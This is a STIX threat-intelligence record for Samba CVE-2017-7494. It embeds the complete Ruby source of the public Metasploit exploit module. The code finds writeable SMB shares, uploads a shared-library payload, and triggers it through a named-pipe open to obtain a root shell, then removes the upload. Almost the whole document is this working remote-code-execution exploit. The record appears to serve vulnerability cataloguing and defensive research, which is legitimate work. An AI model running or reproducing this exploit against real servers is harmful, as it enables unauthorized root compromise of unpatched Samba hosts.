{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--981e5f1c-da03-4bd5-b133-4d00673911e6",
    "created": "2024-08-14T16:57:00.012689Z",
    "modified": "2024-08-14T16:57:00.012693Z",
    "name": "Samba is_known_pipename() Arbitrary Module Load",
    "description": " This module triggers an arbitrary shared library load vulnerability in Samba versions 3.5.0 to 4.4.14, 4.5.10, and 4.6.4. This module requires valid credentials, a writeable folder in an accessible share and knowledge of the server-side path of the writeable folder. In some cases, anonymous access combined with common filesystem locations can be used to automatically exploit this vulnerability. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/samba/is_known_pipename.rb",
            "external_id": "is_known_pipename.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-7494"
        },
        {
            "source_name": "reference",
            "url": "https://www.samba.org/samba/security/CVE-2017-7494.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::DCERPC\n  include Msf::Exploit::Remote::SMB::Client\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Samba is_known_pipename() Arbitrary Module Load',\n      'Description'    => %q{\n          This module triggers an arbitrary shared library load vulnerability\n        in Samba versions 3.5.0 to 4.4.14, 4.5.10, and 4.6.4. This module\n        requires valid credentials, a writeable folder in an accessible share,\n        and knowledge of the server-side path of the writeable folder. In\n        some cases, anonymous access combined with common filesystem locations\n        can be used to automatically exploit this vulnerability.\n      },\n      'Author'         =>\n        [\n          'steelo <knownsteelo[at]gmail.com>',    # Vulnerability Discovery & Python Exploit\n          'hdm',                                  # Metasploit Module\n          'bcoles',  # Check logic\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2017-7494' ],\n          [ 'URL', 'https://www.samba.org/samba/security/CVE-2017-7494.html' ],\n        ],\n      'Payload'         =>\n        {\n          'Space'       => 9000,\n          'DisableNops' => true\n        },\n      'Platform'        => 'linux',\n      'Targets'         =>\n        [\n\n          [ 'Automatic (Interact)',\n            { 'Arch' => ARCH_CMD, 'Platform' => [ 'unix' ], 'Interact' => true,\n              'Payload' => {\n                'Compat' => {\n                  'PayloadType' => 'cmd_interact', 'ConnectionType' => 'find'\n                }\n              }\n            }\n          ],\n          [ 'Automatic (Command)',\n            { 'Arch' => ARCH_CMD, 'Platform' => [ 'unix' ] }\n          ],\n          [ 'Linux x86',        { 'Arch' => ARCH_X86 } ],\n          [ 'Linux x86_64',     { 'Arch' => ARCH_X64 } ],\n          [ 'Linux ARM (LE)',   { 'Arch' => ARCH_ARMLE } ],\n          [ 'Linux ARM64',      { 'Arch' => ARCH_AARCH64 } ],\n          [ 'Linux MIPS',       { 'Arch' => ARCH_MIPS } ],\n          [ 'Linux MIPSLE',     { 'Arch' => ARCH_MIPSLE } ],\n          [ 'Linux MIPS64',     { 'Arch' => ARCH_MIPS64 } ],\n          [ 'Linux MIPS64LE',   { 'Arch' => ARCH_MIPS64LE } ],\n          [ 'Linux PPC',        { 'Arch' => ARCH_PPC } ],\n          [ 'Linux PPC64',      { 'Arch' => ARCH_PPC64 } ],\n          [ 'Linux PPC64 (LE)', { 'Arch' => ARCH_PPC64LE } ],\n          [ 'Linux SPARC',      { 'Arch' => ARCH_SPARC } ],\n          [ 'Linux SPARC64',    { 'Arch' => ARCH_SPARC64 } ],\n          [ 'Linux s390x',      { 'Arch' => ARCH_ZARCH } ],\n        ],\n      'DefaultOptions' =>\n        {\n          'DCERPC::fake_bind_multi' => false,\n          'SHELL'                   => '/bin/sh',\n        },\n      'Privileged'      => true,\n      'DisclosureDate'  => '2017-03-24',\n      'DefaultTarget'   => 0))\n\n    register_options(\n      [\n        OptString.new('SMB_SHARE_NAME', [false, 'The name of the SMB share containing a writeable directory']),\n        OptString.new('SMB_FOLDER', [false, 'The directory to use within the writeable SMB share']),\n      ])\n\n  end\n\n  def post_auth?\n    true\n  end\n\n  # Setup our mapping of Metasploit architectures to gcc architectures\n  def setup\n    super\n    @@payload_arch_mappings = {\n        ARCH_X86      => [ 'x86' ],\n        ARCH_X64      => [ 'x86_64' ],\n        ARCH_MIPS     => [ 'mips' ],\n        ARCH_MIPSLE   => [ 'mipsel' ],\n        ARCH_MIPSBE   => [ 'mips' ],\n        ARCH_MIPS64   => [ 'mips64' ],\n        ARCH_MIPS64LE => [ 'mips64el' ],\n        ARCH_PPC      => [ 'powerpc' ],\n        ARCH_PPC64    => [ 'powerpc64' ],\n        ARCH_PPC64LE  => [ 'powerpc64le' ],\n        ARCH_SPARC    => [ 'sparc' ],\n        ARCH_SPARC64  => [ 'sparc64' ],\n        ARCH_ARMLE    => [ 'armel', 'armhf' ],\n        ARCH_AARCH64  => [ 'aarch64' ],\n        ARCH_ZARCH    => [ 's390x' ],\n    }\n\n    # Architectures we don't offically support but can shell anyways with interact\n    @@payload_arch_bonus = %W{\n      mips64el sparc64 s390x\n    }\n\n    # General platforms (OS + C library)\n    @@payload_platforms = %W{\n      linux-glibc\n    }\n  end\n\n  # List all top-level directories within a given share\n  def enumerate_directories(share)\n    begin\n      vprint_status('Use Rex client (SMB1 only) to enumerate directories, since it is not compatible with RubySMB client')\n      connect(versions: [1])\n      smb_login\n      self.simple.connect(\"\\\\\\\\#{rhost}\\\\#{share}\")\n      stuff = self.simple.client.find_first(\"\\\\*\")\n      directories = [\"\"]\n      stuff.each_pair do |entry,entry_attr|\n        next if %W{. ..}.include?(entry)\n        next unless entry_attr['type'] == 'D'\n        directories << entry\n      end\n\n      return directories\n\n    rescue ::Rex::Proto::SMB::Exceptions::ErrorCode => e\n      vprint_error(\"Enum #{share}: #{e}\")\n      return nil\n\n    ensure\n      simple.disconnect(\"\\\\\\\\#{rhost}\\\\#{share}\")\n      smb_connect\n    end\n  end\n\n  # Determine whether a directory in a share is writeable\n  def verify_writeable_directory(share, directory=\"\")\n    begin\n      simple.connect(\"\\\\\\\\#{rhost}\\\\#{share}\")\n\n      random_filename = Rex::Text.rand_text_alpha(5)+\".txt\"\n      filename = directory.length == 0 ? \"\\\\#{random_filename}\" : \"\\\\#{directory}\\\\#{random_filename}\"\n\n      wfd = simple.open(filename, 'rwct')\n      wfd << Rex::Text.rand_text_alpha(8)\n      wfd.close\n\n      simple.delete(filename)\n      return true\n\n    rescue ::Rex::Proto::SMB::Exceptions::ErrorCode, RubySMB::Error::RubySMBError => e\n      vprint_error(\"Write #{share}#{filename}: #{e}\")\n      return false\n\n    ensure\n      simple.disconnect(\"\\\\\\\\#{rhost}\\\\#{share}\")\n    end\n  end\n\n  # Call NetShareGetInfo to retrieve the server-side path\n  def find_share_path\n    share_info = smb_netsharegetinfo(@share)\n    share_info[:path].gsub(\"\\\\\", \"/\").sub(/^.*:/, '')\n  end\n\n  # Crawl top-level directories and test for writeable\n  def find_writeable_path(share)\n    subdirs = enumerate_directories(share)\n    return unless subdirs\n\n    if datastore['SMB_FOLDER'].to_s.length > 0\n      subdirs.unshift(datastore['SMB_FOLDER'])\n    end\n\n    subdirs.each do |subdir|\n      next unless verify_writeable_directory(share, subdir)\n      return subdir\n    end\n\n    nil\n  end\n\n  # Locate a writeable directory across identified shares\n  def find_writeable_share_path\n    @path = nil\n    share_info = smb_netshareenumall\n    if datastore['SMB_SHARE_NAME'].to_s.length > 0\n      share_info.unshift [datastore['SMB_SHARE_NAME'], 'DISK', '']\n    end\n\n    share_info.each do |share|\n      next if share.first.upcase == 'IPC$'\n      found = find_writeable_path(share.first)\n      next unless found\n      @share = share.first\n      @path  = found\n      break\n    end\n  end\n\n  # Locate a writeable share\n  def find_writeable\n    find_writeable_share_path\n    unless @share && @path\n      print_error(\"No suitable share and path were found, try setting SMB_SHARE_NAME and SMB_FOLDER\")\n      fail_with(Failure::NoTarget, \"No matching target\")\n    end\n    print_status(\"Using location \\\\\\\\#{rhost}\\\\#{@share}\\\\#{@path} for the path\")\n  end\n\n  # Store the wrapped payload into the writeable share\n  def upload_payload(wrapped_payload)\n    begin\n      self.simple.connect(\"\\\\\\\\#{rhost}\\\\#{@share}\")\n\n      random_filename = Rex::Text.rand_text_alpha(8)+\".so\"\n      filename = @path.length == 0 ? \"\\\\#{random_filename}\" : \"\\\\#{@path}\\\\#{random_filename}\"\n\n      wfd = simple.open(filename, 'rwct')\n      wfd << wrapped_payload\n      wfd.close\n\n      @payload_name = random_filename\n\n    rescue ::Rex::Proto::SMB::Exceptions::ErrorCode => e\n      print_error(\"Write #{@share}#{filename}: #{e}\")\n      return false\n\n    ensure\n      simple.disconnect(\"\\\\\\\\#{rhost}\\\\#{@share}\")\n    end\n\n    print_status(\"Uploaded payload to \\\\\\\\#{rhost}\\\\#{@share}#{filename}\")\n    return true\n  end\n\n  # Try both pipe open formats in order to load the uploaded shared library\n  def trigger_payload\n\n    target = [@share_path, @path, @payload_name].join(\"/\").gsub(/\\/+/, '/')\n    [\n      \"\\\\\\\\PIPE\\\\\" + target,\n      target\n    ].each do |tpath|\n\n      print_status(\"Loading the payload from server-side path #{target} using #{tpath}...\")\n\n      smb_connect\n\n      # Try to execute the shared library from the share\n      begin\n        simple.client.create_pipe(tpath)\n        probe_module_path(tpath)\n\n      rescue Rex::StreamClosedError, Rex::Proto::SMB::Exceptions::NoReply, ::Timeout::Error, ::EOFError\n        # Common errors we can safely ignore\n\n      rescue Rex::Proto::SMB::Exceptions::ErrorCode => e\n        # Look for STATUS_OBJECT_PATH_INVALID indicating our interact payload loaded\n        if e.error_code == 0xc0000039\n          pwn\n          return true\n        else\n          print_error(\"  >> Failed to load #{e.error_name}\")\n        end\n      rescue RubySMB::Error::UnexpectedStatusCode, RubySMB::Error::InvalidPacket => e\n        if e.status_code == ::WindowsError::NTStatus::STATUS_OBJECT_PATH_INVALID\n          pwn\n          return true\n        else\n          print_error(\"  >> Failed to load #{e.status_code.name}\")\n        end\n      end\n\n      disconnect\n\n    end\n\n    false\n  end\n\n  def pwn\n    print_good(\"Probe response indicates the interactive payload was loaded...\")\n    smb_shell = self.sock\n    self.sock = nil\n    remove_socket(sock)\n    handler(smb_shell)\n  end\n\n  # Use fancy payload wrappers to make exploitation a joyously lazy exercise\n  def cycle_possible_payloads\n    template_base = ::File.join(Msf::Config.data_directory, \"exploits\", \"CVE-2017-7494\")\n    template_list = []\n    template_type = nil\n    template_arch = nil\n\n    # Handle the generic command types first\n    if target.arch.include?(ARCH_CMD)\n      template_type = target['Interact'] ? 'findsock' : 'system'\n\n      all_architectures = @@payload_arch_mappings.values.flatten.uniq\n\n      # Include our bonus architectures for the interact payload\n      if target['Interact']\n        @@payload_arch_bonus.each do |t_arch|\n          all_architectures << t_arch\n        end\n      end\n\n      # Prioritize the most common architectures first\n      %W{ x86_64 x86 armel armhf mips mipsel }.each do |t_arch|\n        template_list << all_architectures.delete(t_arch)\n      end\n\n      # Queue up the rest for later\n      all_architectures.each do |t_arch|\n        template_list << t_arch\n      end\n\n    # Handle the specific architecture targets next\n    else\n      template_type = 'shellcode'\n      target.arch.each do |t_name|\n        @@payload_arch_mappings[t_name].each do |t_arch|\n          template_list << t_arch\n        end\n      end\n    end\n\n    # Remove any duplicates that mau have snuck in\n    template_list.uniq!\n\n    # Cycle through each top-level platform we know about\n    @@payload_platforms.each do |t_plat|\n\n      # Cycle through each template and yield\n      template_list.each do |t_arch|\n\n\n        wrapper_path = ::File.join(template_base, \"samba-root-#{template_type}-#{t_plat}-#{t_arch}.so.gz\")\n        next unless ::File.exist?(wrapper_path)\n\n        data = ''\n        ::File.open(wrapper_path, \"rb\") do |fd|\n          data = Rex::Text.ungzip(fd.read)\n        end\n\n        pidx = data.index('PAYLOAD')\n        if pidx\n          data[pidx, payload.encoded.length] = payload.encoded\n        end\n\n        vprint_status(\"Using payload wrapper 'samba-root-#{template_type}-#{t_arch}'...\")\n        yield(data)\n      end\n    end\n  end\n\n  # Verify that the payload settings make sense\n  def sanity_check\n    if target['Interact'] && datastore['PAYLOAD'] != \"cmd/unix/interact\"\n      print_error(\"Error: The interactive target is chosen (0) but PAYLOAD is not set to cmd/unix/interact\")\n      print_error(\"       Please set PAYLOAD to cmd/unix/interact and try this again\")\n      print_error(\"\")\n      fail_with(Failure::NoTarget, \"Invalid payload chosen for the interactive target\")\n    end\n\n    if ! target['Interact'] && datastore['PAYLOAD'] == \"cmd/unix/interact\"\n      print_error(\"Error: A non-interactive target is chosen but PAYLOAD is set to cmd/unix/interact\")\n      print_error(\"       Please set a valid PAYLOAD and try this again\")\n      print_error(\"\")\n      fail_with(Failure::NoTarget, \"Invalid payload chosen for the non-interactive target\")\n    end\n  end\n\n  # Shorthand for connect and login\n  def smb_connect\n    connect\n    smb_login\n  end\n\n  # Start the shell train\n  def exploit\n    # Validate settings\n    sanity_check\n\n    # Setup SMB\n    smb_connect\n\n    # Find a writeable share\n    find_writeable\n\n    # Retrieve the server-side path of the share like a boss\n    print_status(\"Retrieving the remote path of the share '#{@share}'\")\n    @share_path = find_share_path\n    print_status(\"Share '#{@share}' has server-side path '#{@share_path}\")\n\n    # Disconnect\n    disconnect\n\n    # Create wrappers for each potential architecture\n    cycle_possible_payloads do |wrapped_payload|\n\n      # Connect, upload the shared library payload, disconnect\n      smb_connect\n      upload_payload(wrapped_payload)\n      disconnect\n\n      # Trigger the payload\n      early = trigger_payload\n\n      # Cleanup the payload\n      begin\n        smb_connect\n        simple.connect(\"\\\\\\\\#{rhost}\\\\#{@share}\")\n        uploaded_path = @path.length == 0 ? \"\\\\#{@payload_name}\" : \"\\\\#{@path}\\\\#{@payload_name}\"\n        simple.delete(uploaded_path)\n        disconnect\n      rescue Rex::StreamClosedError, Rex::Proto::SMB::Exceptions::NoReply, ::Timeout::Error, ::EOFError\n      end\n\n      # Bail early if our interact payload loaded\n      return if early\n    end\n  end\n\n  # A version-based vulnerability check for Samba\n  def check\n    res = smb_fingerprint\n\n    unless res['native_lm'] =~ /Samba ([\\d\\.]+)/\n      print_error(\"does not appear to be Samba: #{res['os']} / #{res['native_lm']}\")\n      return CheckCode::Safe\n    end\n\n    samba_version = Rex::Version.new($1.gsub(/\\.$/, ''))\n\n    vprint_status(\"Samba version identified as #{samba_version.to_s}\")\n\n    if samba_version < Rex::Version.new('3.5.0')\n      return CheckCode::Safe\n    end\n\n    # Patched in 4.4.14\n    if samba_version < Rex::Version.new('4.5.0') &&\n       samba_version >= Rex::Version.new('4.4.14')\n      return CheckCode::Safe\n    end\n\n    # Patched in 4.5.10\n    if samba_version > Rex::Version.new('4.5.0') &&\n       samba_version < Rex::Version.new('4.6.0') &&\n       samba_version >= Rex::Version.new('4.5.10')\n      return CheckCode::Safe\n    end\n\n    # Patched in 4.6.4\n    if samba_version >= Rex::Version.new('4.6.4')\n      return CheckCode::Safe\n    end\n\n    smb_connect\n    find_writeable_share_path\n    disconnect\n\n    if @share.to_s.length == 0\n      print_status(\"Samba version #{samba_version.to_s} found, but no writeable share has been identified\")\n      return CheckCode::Detected\n    end\n\n    print_good(\"Samba version #{samba_version.to_s} found with writeable share '#{@share}'\")\n    return CheckCode::Appears\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-03-24",
    "x_mitre_platforms": [
        "linux'"
    ]
}